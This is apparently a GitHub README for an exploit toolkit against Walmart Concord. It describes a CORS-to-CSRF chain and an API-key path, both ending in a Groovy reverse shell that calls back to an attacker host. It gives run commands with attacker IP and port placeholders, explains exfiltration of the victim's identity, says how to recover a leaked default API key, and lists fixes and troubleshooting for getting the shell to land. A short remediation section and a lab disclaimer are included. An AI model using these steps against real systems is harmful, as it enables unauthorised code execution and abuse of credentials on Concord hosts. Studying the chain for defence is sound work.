# Concord → Groovy RCE Toolkit

> Two automated paths to authenticated remote code execution against **Walmart Concord**, each ending in an interactive reverse shell — all driven from a single terminal.

Concord ships with a permissive CORS policy, no CSRF protection on state-changing endpoints, and the ability to run inline Groovy inside a `concord.yml` process definition. Those three facts chain into full RCE. This toolkit provides **two** ready-to-run exploits:

- **`avto.py`** — CORS → CSRF chain. A logged-in victim opens an attacker page; their session is ridden cross-origin to upload a malicious flow. No credentials needed by the attacker.
- **`avto_token.py`** — API-key path. Given a leaked/recovered Concord API key, start the malicious process directly via the REST API. No browser, no victim interaction.

Both land a reverse shell as the `concord` service user.

---

## ⚠️ Disclaimer

For authorized testing and education only. Run **exclusively** against systems you own or have explicit written permission to test (e.g. a lab you control). Unauthorized use is illegal. The author assumes no liability for misuse.

---

## Table of Contents

- [The Vulnerability](#the-vulnerability)
- [Attack Chains](#attack-chains)
- [Requirements](#requirements)
- [Path A — CORS → CSRF (`avto.py`)](#path-a--cors--csrf-avtopy)
- [Path B — API Key (`avto_token.py`)](#path-b--api-key-avto_tokenpy)
- [Critical Gotchas (read this)](#critical-gotchas-read-this)
- [Troubleshooting](#troubleshooting)
- [Detection & Remediation](#detection--remediation)
- [References](#references)

---

## The Vulnerability

| # | Weakness | Effect |
|---|----------|--------|
| 1 | **Permissive CORS** | The API reflects the origin and allows credentialed cross-origin reads, so attacker JS can read authenticated responses. The `Authorization` header is also CORS-allowed. |
| 2 | **No CSRF protection** | The process-creation endpoint accepts a cross-origin `multipart/form-data` POST with only the session cookie — no anti-CSRF token. |
| 3 | **Arbitrary Groovy execution** | A `concord.yml` flow can pull a Maven dependency and run an inline Groovy `body`, i.e. arbitrary JVM code, by design. |
| 4 | **Insecure default credential** | Older builds seed a default `concordAgent` API key via DB migration, left commented in the public source. It often survives into running instances, granting API access with no phishing required. |

Individually each is a config smell. Chained, an attacker achieves code execution on the Concord host either by phishing a logged-in user (Path A) or with the leaked key alone (Path B).

---

## Attack Chains

```
PATH A — CORS / CSRF
[ Victim browser, authenticated ] -- opens --> [ attacker page ]
   1. fetch /whoami (credentials:include)  --> read identity, exfil
   2. POST /api/v1/process (credentials:include, concord.yml) --> Groovy RCE
                                                          |
PATH B — API KEY                                          v
[ attacker + leaked key ] -- POST /api/v1/process --> [ Concord host ]
                                                          |
                                              reverse shell --> attacker
```

---

## Requirements

- Python 3.8+ on the attacker box.
- A reachable Concord instance.
- Free ports on the attacker box: `80` (Path A payload/exfil) and a shell port such as `9000`.
- **Path A:** a way to get an authenticated victim to load your page (the lab activity simulator does this).
- **Path B:** a valid Concord API key (e.g. the leaked `concordAgent` default recovered from the source DB migrations).

---

## Path A — CORS → CSRF (`avto.py`)

Hosts the malicious page, captures exfil, and handles the shell in one process.

```bash
sudo python3 avto.py <ATTACKER_IP>
```

Deliver `http://<ATTACKER_IP>/` to the authenticated victim. The page calls `/whoami` with credentials, exfiltrates the identity, then POSTs the malicious `concord.yml` cross-origin. Output streams in one terminal: payload served → identity → process `instanceId` → shell.

> 📸 **SCREENSHOT — Path A full run** *(optional)*
> *Place: terminal showing identity exfil (`concordAgent`), process `instanceId`/`ok:true`, then `SHELL TUTULDU` with `whoami → concord`.*

### The `// FIXME` that breaks naive attempts

The classic dead end is a bare process POST:

```js
fetch("http://concord:8001/api/v1/process", {
    // FIXME
    body: fd
});
```

`whoami` succeeds but no shell lands, because two things are missing:

1. **`method: 'POST'`** — a bare `fetch` defaults to GET; process creation needs POST.
2. **`credentials: 'include'`** — without it the session cookie isn't attached to *this* request, so it arrives unauthenticated and Concord rejects it.

Fix both and the chain completes.

---

## Path B — API Key (`avto_token.py`)

No browser, no victim. Given an API key, start the process directly via REST, poll its status, and catch the shell.

```bash
python3 avto_token.py \
  --target http://192.168.163.132:8001 \
  --apikey "<API_KEY>" \
  --lhost 192.168.X.X \
  --lport 9000 \
  [--groovy 2.5.8]
```

The script:
1. Builds a `concord.yml` with your `lhost`/`lport` templated into an inline Groovy reverse shell.
2. POSTs it as `multipart/form-data` to `/api/v1/process` with `Authorization: <key>`.
3. Polls `/api/v1/process/{id}` and prints each status transition (`NEW → ENQUEUED → STARTING → RUNNING`).
4. On a `FAILED`/`FINISHED`-without-shell, it auto-pulls the process log and tells you what to fix.
5. On connect, drops into an interactive shell and auto-runs `id; hostname; whoami`.

> 📸 **SCREENSHOT — Path B full run**
> *Place: the run showing status `NEW → ENQUEUED → STARTING`, then `SHELL TUTULDU ← <host>` and `uid=...(concord)`. This is the money shot.*

<img width="879" height="620" alt="image" src="https://github.com/user-attachments/assets/6c15c815-19ff-447b-8e53-61c1273285d1" />


### How the API key is recovered (lab context)

In the older Concord source, a DB migration seeds a default `concordAgent` user and API key. The developers left the usable key commented above the hashed value in the public XML migration — so reading the migrations yields a working key. Authenticate to confirm it:

```bash
curl -H "Authorization: <API_KEY>" http://<host>:8001/api/v1/apikey
```

A JSON array (not a 401) means the key is live. You can also log into the UI by appending `?useApiKey=true` to the login URL.

> 📸 **SCREENSHOT — Authenticated UI via API key** *(optional)*
> *Place: the Concord "Activity" dashboard logged in as `concordagent`.*

---

## Critical Gotchas (read this)

These are the exact things that cost the most time. Learn them once.

### 1. Groovy version must match what the host can resolve

The single biggest time-sink. If the host can't pull the pinned Groovy dependency, the process **hangs in `STARTING` forever** (or goes `FAILED`) — and **no shell ever lands**.

- The official Concord examples use **`groovy-all:pom:2.5.8`** — that version is the one cached/resolvable on the lab host.
- An arbitrary version like `2.5.2` will **stall in `STARTING`** because it isn't available.
- `avto_token.py` defaults to `2.5.8`. If a target stalls, try `--groovy 2.5.8` explicitly, or check the process log for a dependency-download line.

> A `STARTING` that never advances ≈ dependency not resolving. It is almost never an `lhost` problem.

### 2. `ok: true` ≠ success

The POST response `ok: true` only means the process was **accepted into the queue** — not that it ran. Always watch the status transitions and the process log; `avto_token.py` does this for you.

### 3. lhost must be reachable *from the Concord host*

The reverse shell dials back from the Concord host, so `lhost` must be an IP the host can route to. In the lab, both the VPN interface and the local lab-network interface worked once the Groovy version was correct — confirm with the shell's source IP in the `SHELL TUTULDU` line. If it stalls *after* `RUNNING`, then suspect `lhost`/egress; if it stalls in `STARTING`, suspect the Groovy version (see #1).

### 4. Privileged ports need root

Using `--lport 443` (or anything < 1024) requires `sudo`. `9000` avoids the password prompt entirely.

### 5. YAML whitespace is load-bearing

The `body: |` block scalar is whitespace-sensitive; a stray tab breaks the flow. Both scripts template the YAML for you, so don't hand-edit indentation.

---

## Troubleshooting

| Symptom | Cause / Fix |
|---------|-------------|
| Stuck in `STARTING`, no shell | Groovy dependency not resolvable. Use `--groovy 2.5.8`; check the process log. |
| `FAILED` immediately | Bad YAML or unresolved dependency — read the auto-printed log. |
| `ok:true` but never advances | Same as `STARTING` — queue accepted it, runtime can't resolve deps. |
| `RUNNING`/`FINISHED` but no shell | `lhost` not reachable from the Concord host, or egress-filtered. |
| HTTP 401 on POST | API key wrong/expired, or wrong header. It goes as `Authorization: <key>` with no prefix. |
| Path A: `whoami` works, no shell | The `// FIXME` — missing `method:'POST'` and/or `credentials:'include'`. |
| Path A: `UserNotLoggedIn` | Victim has no active session — re-run the simulator. |
| Port bind error on 443 | Run with `sudo`, or use `--lport 9000`. |

---

## Detection & Remediation

**Defenders:**
- Replace reflective CORS with a strict allow-list; never combine origin reflection with `Access-Control-Allow-Credentials: true`, and don't CORS-allow `Authorization`.
- Add anti-CSRF tokens or `SameSite=Strict` cookies to state-changing endpoints like process creation.
- Rotate/remove any default seeded API keys; never ship usable secrets (even commented) in source or DB migrations.
- Sandbox or gate flow capabilities — inline Groovy and arbitrary dependency resolution are remote code execution by design.
- Egress-filter the Concord host so it can't open arbitrary outbound TCP.

---

## References

- Walmart Concord — official documentation (process API, dependencies, scripting).
- MDN — CORS, `fetch` credentials, `FormData`.
- OWASP — CORS misconfiguration, CSRF, hardcoded credentials.

---

*Built as a lab exercise in chaining CORS → CSRF → arbitrary-code-execution, plus credential-recovery → API RCE. Understand the chain, don't just run the script.*
